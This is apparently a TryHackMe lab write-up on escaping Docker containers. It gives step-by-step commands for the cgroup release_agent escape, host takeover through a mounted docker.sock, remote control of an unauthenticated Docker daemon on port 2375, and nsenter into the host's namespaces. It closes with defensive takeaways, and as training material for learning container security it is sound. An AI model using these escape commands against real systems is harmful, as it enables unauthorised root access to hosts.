# Docker Container Escapes — TryHackMe Writeup

Focuses on how an attacker who already has root access *inside* a Docker container can break out and gain control of the underlying host. Unlike typical web app vulnerabilities, these bugs live in the Docker configuration itself — usually the result of containers being given more privilege or access than they actually need.

Four separate escape techniques are covered below. Each one abuses a different Docker feature that was either misconfigured or overly permissive.

---

## Task 3 — Escaping via Privileged Container Capabilities (cgroups abuse)

**The idea:** When a container runs in `--privileged` mode, it skips the usual isolation layer and talks to the host's kernel almost directly. One of the things it can touch is **cgroups** — a kernel feature that manages groups of processes. Cgroups have a setting called `release_agent`: a script the *host kernel itself* runs whenever a cgroup finishes up. Since a privileged container can set what that script is, the host can be tricked into running arbitrary code as root.

**Steps:**

1. Check what capabilities the container actually has:
   ```bash
   capsh --print
   ```

2. Create and mount a new cgroup inside the container:
   ```bash
   mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
   ```

3. Tell the kernel to trigger the release agent once this cgroup empties out:
   ```bash
   echo 1 > /tmp/cgrp/x/notify_on_release
   ```

4. Find where the container's files actually live on the host's disk:
   ```bash
   host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
   ```

5. Point the release agent at a file inside the container (which, from the host's perspective, is the same file):
   ```bash
   echo "$host_path/exploit" > /tmp/cgrp/release_agent
   ```

6. Write the payload — in this case, copying the host's flag into the container:
   ```bash
   echo '#!/bin/sh' > /exploit
   echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
   chmod a+x /exploit
   ```

7. Trigger the exploit by putting a dummy process into the cgroup and letting it exit immediately:
   ```bash
   sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
   ```

8. Read the result:
   ```bash
   cat /flag.txt
   ```

**Result:** The host's flag file was copied into the container and successfully read.

**Why this works:** The `release_agent` script is executed by the *host kernel*, not the container, so any command written there runs with full host privileges — completely bypassing the container boundary.

![Task 3 - cgroups exploit](./screenshots/task3-cgroups-exploit.png)

---

## Task 4 — Escaping via an Exposed Docker Socket

**The idea:** Docker containers normally talk to the Docker Engine through a socket file (`docker.sock`), similar to how two programs might pass messages back and forth on the same machine instead of over a network. If that socket file gets mounted *inside* a container, the container can issue commands directly to the **host's** Docker Engine — meaning it can ask Docker to spin up a brand new container and mount the entire host filesystem into it.

**Steps:**

1. Look for the Docker socket file:
   ```bash
   ls -la /var/run | grep sock
   ```

2. Confirm Docker commands can actually be run from inside the container:
   ```bash
   docker ps
   ```

3. Use Docker to spin up a new lightweight container, mounting the host's entire root filesystem into it:
   ```bash
   docker run -v /:/mnt --rm -it alpine chroot /mnt sh
   ```
   - `-v /:/mnt` mounts the host's `/` into `/mnt` of the new container
   - `chroot /mnt sh` makes that mounted folder become the new container's root directory, putting the shell inside the host's filesystem

4. Confirm the escape worked:
   ```bash
   ls /
   ```
   This shows the host's real directory structure (`boot`, `etc`, `home`, `root`, etc.) rather than the minimal container filesystem.

5. Read the host's flag:
   ```bash
   cat /root/flag.txt
   ```

**Result:** Flag retrieved successfully (redacted in this writeup).

**Why this works:** Anyone who can talk to the Docker socket effectively has the same power as Docker itself — which runs as root on the host. Mounting the socket into a container is functionally the same as giving that container root on the host.

![Task 4 - Docker socket exploit](./screenshots/task4-docker-socket-exploit.png)

---

## Task 5 — Remote Code Execution via an Exposed Docker Daemon (TCP)

**The idea:** Docker doesn't just use local sockets — it can also be configured to accept commands over the network via TCP (commonly port `2375`). This is meant for legitimate remote management (e.g. deployment tools like Portainer or Jenkins), but if it's exposed without authentication, anyone on the network can control it.

**Steps:**

1. Scan the target for an open Docker port:
   ```bash
   nmap -sV -p 2375 10.130.139.246
   ```
   Result: port 2375 open, confirmed running Docker 20.10.20.

2. Verify the Docker API is reachable:
   ```bash
   curl http://10.130.139.246:2375/version
   ```

3. Point the local Docker CLI at the remote target using the `-H` flag and list running containers — without ever logging into the machine:
   ```bash
   docker -H tcp://10.130.139.246:2375 ps
   ```

**Result:** Target's running containers listed remotely, confirming full command execution capability against the exposed Docker daemon.

**Why this matters:** Once this level of access is confirmed, an attacker can start, stop, or create containers on the target — including using the same filesystem-mounting trick from Task 4, but without ever needing a foothold on the machine first.

**Default Docker Engine port:** `2375`

![Task 5 - Remote Docker daemon](./screenshots/task5-remote-docker-daemon.png)

---

## Task 6 — Abusing Shared Namespaces

**The idea:** Containers normally can't see host processes because they live in a separate "namespace" — each container gets its own private view of what's running on the system. Some containers, however, are deliberately configured to share the host's namespaces (for example, to support debugging tools). If this is the case, the container can actually see host processes when running `ps aux` — including PID 1, which is always the very first process the system started.

**Steps:**

1. Check the running processes inside the container:
   ```bash
   ps aux
   ```
   Seeing far more processes than a normal minimal container would have — including host-level services like `dockerd`, `systemd-journald`, and `sshd`, with PID 1 being `/sbin/init` — is the giveaway that the container shares the host's process namespace.

2. Use `nsenter` to join the namespaces of PID 1 (the host's init process), jumping into the host environment:
   ```bash
   nsenter --target 1 --mount --uts --ipc --net /bin/bash
   ```
   - `--target 1` — targets PID 1 (the host's init process)
   - `--mount` — joins its filesystem view
   - `--uts` — joins its hostname namespace
   - `--ipc` — joins its inter-process memory-sharing namespace
   - `--net` — joins its network namespace

   Note: this can fail with permission errors on every namespace even as root, if the container is missing certain Linux capabilities (e.g. `SYS_PTRACE`, `SYS_ADMIN`). Reconnecting with a fresh session resolved this in testing.

3. Confirm the escape worked by checking the hostname:
   ```bash
   hostname
   ```
   A hostname different from the container's own confirms the shell is now inside the host's environment.

4. Read the host's flag:
   ```bash
   cat /home/tryhackme/flag.txt
   ```

**Result:** Successfully escaped into the host namespace and retrieved the flag.

**Why this works:** Namespaces are the actual mechanism that makes containerization possible in the first place. If a container shares the host's PID namespace (visible via `ps aux`) and has sufficient capabilities, tools like `nsenter` can be used to join the host's other namespaces too — undoing the isolation Docker is supposed to provide.

![Task 6 - ps aux showing host processes](./screenshots/task6-ps-aux-host-processes.png)

![Task 6 - nsenter and hostname change](./screenshots/task6-nsenter-hostname.png)

---

## Key Takeaways

- **Privileged mode is dangerous by default** — it removes almost all of Docker's isolation guarantees.
- **The Docker socket is equivalent to root** — anything that can talk to it can control the whole host.
- **Never expose the Docker daemon over TCP without authentication/TLS** — this is functionally the same as leaving the socket wide open to the network.
- **Namespace sharing should be minimal and deliberate** — only share what's strictly necessary (e.g. specific debugging use cases), never by default.
